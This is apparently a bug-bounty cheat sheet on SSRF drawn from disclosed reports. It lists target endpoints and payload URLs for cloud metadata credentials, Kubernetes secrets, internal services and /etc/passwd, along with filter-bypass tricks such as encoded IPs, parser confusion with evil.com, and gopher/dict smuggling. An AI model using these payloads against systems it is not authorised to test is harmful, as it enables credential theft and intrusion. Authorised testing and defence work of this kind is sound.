# SSRF — 9 Disclosed Reports

---

## High-Signal Targets

- URL input fields: webhook URLs, import-from-URL, avatar URL fetch
- PDF, screenshot, and thumbnail generation (Puppeteer, PhantomJS)
- Kubernetes API aggregation layer
- XML/CSV importers fetching external entities
- IMDSv1-enabled cloud instances (no token requirement)

**URL patterns to test:**
```
/api/*/preview, /api/*/fetch, /api/*/import
/api/*/webhook, /api/*/proxy, /api/*/render
?url=, ?uri=, ?endpoint=, ?redirect=
?src=, ?feed=, ?host=, ?target=
```

---

## Paid Patterns

**AWS metadata exfiltration:**
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
```

**GCP metadata:**
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Requires: -H "Metadata-Flavor: Google"
```

**Kubernetes API extension server redirect:**
```
http://127.0.0.1:6443/api/v1/namespaces/kube-system/secrets
# Hijacked extension server redirects to internal API, cluster takeover
```

**Internal services:**
```
http://localhost:6379       (Redis)
http://localhost:9200       (Elasticsearch)
http://localhost:27017      (MongoDB)
http://localhost:8080/admin (Internal admin panel)
```

**Redirect chain bypass:**
```
# Allowlisted domain has open redirect
https://trusted.com/redirect?url=http://169.254.169.254/latest/meta-data/
# Server follows redirect without re-validating destination
```

---

## Bypass Techniques

**IP encoding:**
```
2130706433          (decimal for 127.0.0.1)
0x7f000001          (hex)
0177.0.0.1          (octal)
[::1]               (IPv6 loopback)
[::ffff:127.0.0.1]  (IPv6 mapped)
```

**URL parser confusion:**
```
evil.com@127.0.0.1
127.0.0.1#evil.com
evil.com%40127.0.0.1
```

**Protocol confusion:**
```
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_INFO
ldap://127.0.0.1:389
```

**DNS rebinding:**
Domain resolves to allowlisted IP during validation, then rebinds to `127.0.0.1` during fetch.

---

## Root Causes (from paid reports)

1. Unvalidated user-supplied URLs passed directly to HTTP client
2. Redirect-following without re-validating destination after each hop
3. Kubernetes API aggregation layer trusted without authentication
4. Headless browser executing JavaScript without network sandboxing
5. IMDSv1 enabled on cloud instances (no token requirement)
6. XML/CSV importers fetching external entities via `SYSTEM` or `href`

---

## Real-World Scenarios

**Scenario 1 - GCP/Snapchat link preview**
Headless browser rendering link previews executed JavaScript, which fetched the GCP metadata endpoint. IAM service account token exfiltrated.

**Scenario 2 - Kubernetes API extension server**
Extension API server hijacked to redirect requests to `127.0.0.1:6443`. Internal cluster API accessed, secrets enumerated, cluster compromised.

**Scenario 3 - False positive (SharePoint)**
`/_layouts/15/download.aspx?SourceUrl=` echoed the URL in error messages. Looked like SSRF but server never made outbound requests. Confirm with OOB callback, not just reflection.

---

## Pre-Submission Validation Gate

1. Did you receive an OOB callback confirming the server made an outbound request?
2. What internal resource can be reached? (metadata, internal service, cloud credentials)
3. Is impact beyond port scanning? (credentials exfiltrated, internal data exposed)
